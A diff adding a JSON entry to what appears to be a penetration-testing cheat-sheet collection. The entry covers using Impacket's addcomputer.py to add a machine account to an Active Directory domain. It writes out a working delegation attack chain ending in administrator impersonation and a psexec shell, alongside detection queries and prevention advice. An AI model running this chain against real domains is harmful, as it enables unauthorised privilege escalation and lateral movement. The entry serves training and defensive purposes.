@@ -1,0 +1,95 @@
+{
+  "id": "ad-addcomputer",
+  "name": "addcomputer.py - Add Machine Account to Domain",
+  "command": "python3 addcomputer.py -computer-name FAKE01$ -computer-pass Password123 -dc-ip <dc_ip> <domain>/<user>:<pass>",
+  "description": "Impackets addcomputer.py adds a machine account to the domain. By default, any domain user can add up to 10 computers (ms-DS-MachineAccountQuota). The created machine account is needed for RBCD attacks, relay attacks, and S4U2Self abuse where you need a computer account you control.",
+  "platform": "linux",
+  "type": "command",
+  "opsec": "moderate",
+  "category": "Active Directory",
+  "subcategory": "Lateral Movement",
+  "certifications": [
+    "CRTP",
+    "CPTS"
+  ],
+  "primary_cert": "CPTS",
+  "source": "Impacket/addcomputer.py; CPTS RBCD chain",
+  "tags": [
+    "addcomputer",
+    "impacket",
+    "machine-account",
+    "maq",
+    "rbcd",
+    "relay"
+  ],
+  "mitre": [
+    "T1136.002"
+  ],
+  "exam": "exam-ok",
+  "notes": "=== THE IDEA ===\nms-DS-MachineAccountQuota (default: 10) allows any domain user\nto add up to 10 computer accounts. This is a prerequisite for\nRBCD attacks where you need a computer account you control.\n\n=== ADD MACHINE ACCOUNT ===\n  python3 addcomputer.py -computer-name FAKE01$ -computer-pass Password123 -dc-ip <dc_ip> <domain>/<user>:<pass>\n\n=== CHECK MAQ ===\n  # PowerShell:\n  Get-ADObject -Identity \"DC=<domain_short>,DC=local\" -Properties ms-DS-MachineAccountQuota\n  # ldapsearch:\n  ldapsearch -H ldap://<dc_ip> -D \"<user>@<domain>\" -w \"<pass>\" -b \"DC=<domain_short>,DC=local\" ms-DS-MachineAccountQuota\n\n=== USE IN RBCD CHAIN ===\n  # 1. Add machine account\n  python3 addcomputer.py -computer-name FAKE01$ -computer-pass Password123 <domain>/<user>:<pass>\n  # 2. Set RBCD delegation\n  python3 rbcd.py -delegate-from FAKE01$ -delegate-to <target>$ -action write <domain>/<user>:<pass>\n  # 3. Get ticket via S4U\n  python3 getST.py -spn cifs/<target>.<domain> -impersonate administrator <domain>/FAKE01$:Password123\n  # 4. Use ticket\n  export KRB5CCNAME=administrator.ccache\n  python3 psexec.py -k -no-pass <target>.<domain>\n\n=== POWERSHELL ALTERNATIVE ===\n  New-MachineAccount -MachineAccount FAKE01 -Password (ConvertTo-SecureString \"Password123\" -AsPlainText -Force)",
+  "examples": [
+    {
+      "label": "Add machine account to domain",
+      "command": "python3 addcomputer.py -computer-name FAKE01$ -computer-pass Password123 -dc-ip 192.168.1.10 corp.local/jdoe:Password123"
+    },
+    {
+      "label": "Check MachineAccountQuota",
+      "command": "ldapsearch -H ldap://192.168.1.10 -D \"jdoe@corp.local\" -w \"Password123\" -b \"DC=corp,DC=local\" ms-DS-MachineAccountQuota"
+    },
+    {
+      "label": "PowerShell - add machine account",
+      "command": "New-MachineAccount -MachineAccount FAKE01 -Password (ConvertTo-SecureString \"Password123\" -AsPlainText -Force)"
+    }
+  ],
+  "references": [
+    {
+      "title": "Impacket - addcomputer.py",
+      "url": "https://github.com/fortra/impacket"
+    },
+    {
+      "title": "MITRE T1136.002 - Create Account: Domain Account",
+      "url": "https://attack.mitre.org/techniques/T1136/002/"
+    }
+  ],
+  "recommended": [
+    {
+      "id": "ad-impacket-rbcd",
+      "note": "RBCD requires a controlled machine account - addcomputer creates one.",
+      "rel": "next"
+    }
+  ],
+  "defense": {
+    "why_it_works": "The ms-DS-MachineAccountQuota attribute (default 10) allows any authenticated user to add computer accounts to the domain. These accounts have SPNs and can be used for delegation attacks.",
+    "prerequisites": "Valid domain credentials; MachineAccountQuota > 0.",
+    "impact": "Enables RBCD attacks, Kerberos relay attacks, and S4U2Self impersonation by providing a controlled computer account.",
+    "detection": "[MITRE T1136.002] Event 4741 (computer account created) by non-admin users.",
+    "artifacts": "Event 4741 (computer account created); new computer object in AD with non-standard naming.",
+    "splunk_spl": "index=windows EventCode=4741\n| where NOT match(SubjectUserName, \"SYSTEM|admin\")\n| table _time, SubjectUserName, TargetUserName, TargetDomainName",
+    "elastic_kql": "event.code:\"4741\" AND NOT user.name:(\"SYSTEM\" OR \"*admin*\")",
+    "sentinel_kql": "SecurityEvent\n| where EventID == 4741\n| where SubjectUserName !in (\"SYSTEM\") and SubjectUserName !contains \"admin\"\n| project TimeGenerated, SubjectUserName, TargetUserName",
+    "sigma_rules": "win_security_machine_account_creation_non_admin",
+    "prevention": "Set ms-DS-MachineAccountQuota to 0; require admin approval for computer account creation; monitor Event 4741.",
+    "sources": [
+      "CPTS methodology",
+      "https://attack.mitre.org/techniques/T1136/002/"
+    ],
+    "detections": [
+      {
+        "platform": "sentinel",
+        "name": "Machine account creation by non-admin user",
+        "logic": "SecurityEvent\n| where EventID == 4741\n| where SubjectUserName !in (\"SYSTEM\", \"ANONYMOUS LOGON\")\n| where SubjectUserName !has \"admin\"\n| project TimeGenerated, SubjectUserName, TargetUserName, SubjectDomainName",
+        "data_source": "windows-security",
+        "log_ids": [
+          "4741"
+        ],
+        "attack": [
+          "T1136.002"
+        ],
+        "fidelity": "behavioral",
+        "confidence": "high",
+        "false_positives": "Helpdesk staff joining workstations; SCCM deployments",
+        "tuning": "Whitelist known machine-join service accounts; alert on any non-standard computer creation"
+      }
+    ]
+  }
+}
